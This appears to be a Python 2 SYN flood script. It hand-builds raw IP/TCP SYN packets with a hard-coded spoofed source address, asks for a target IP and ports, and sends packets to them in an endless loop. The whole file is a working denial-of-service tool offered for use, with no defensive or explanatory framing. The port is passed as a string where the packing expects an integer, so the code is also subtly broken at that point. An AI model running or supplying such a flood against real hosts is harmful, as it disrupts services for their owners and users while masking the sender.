import socket
import random
from struct import *


def checksum(msg):
  s = 0
  for i in range(0, len(msg), 2):
    w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
    s = s + w
  s = (s>>16) + (s & 0xffff);
  s = ~s & 0xffff
  return s

def synPacket(dest_ip,source_ip,dest):
  packet = ''; 
  # ip header fields
  ihl = 5
  version = 4
  tos = 0
  tot_len = 20 + 20	# python seems to correctly fill the total length, dont know how ??
  id = 54321	#Id of this packet
  frag_off = 0
  ttl = 255
  protocol = socket.IPPROTO_TCP
  check = 10	# python seems to correctly fill the checksum
  saddr = socket.inet_aton ( source_ip )	#Spoof the source ip address if you want to
  daddr = socket.inet_aton ( dest_ip )
  ihl_version = (version << 4) + ihl
  # the ! in the pack format string means network order
  ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
  # tcp header fields
  source = 1234	# source port
  #dest = 80	# destination port
  seq = 0
  ack_seq = 0
  doff = 5	#4 bit field, size of tcp header, 5 * 4 = 20 bytes
  #tcp flags
  fin = 0
  syn = 1
  rst = 0
  psh = 0
  ack = 0
  urg = 0
  window = socket.htons (5840)	#	maximum allowed window size
  check = 0
  urg_ptr = 0

  offset_res = (doff << 4) + 0
  tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
  # the ! in the pack format string means network order
  tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
  # pseudo header fields
  source_address = socket.inet_aton( source_ip )
  dest_address = socket.inet_aton(dest_ip)
  placeholder = 0
  protocol = socket.IPPROTO_TCP
  tcp_length = len(tcp_header)
  psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
  psh = psh + tcp_header;
  tcp_checksum = checksum(psh)
  # make the tcp header again and fill the correct checksum
  tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
  # final full packet - syn packets dont have any data
  packet = ip_header + tcp_header
  return packet


#main program
sent = 0

ip = raw_input('Target IP: ')
port = raw_input('Ports(sepparated by comma): ')
ports = port.split(',')

packets={}

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

for p in ports:
  packets[p]=synPacket(ip,"192.168.1.1",p)

while 1: #infinte loop
  for p in ports:
    sock.sendto(packets[p],(ip,int(p)))
    sent = sent + 1 
  print("Sent %s amount of packets to %s" %(sent,ip))

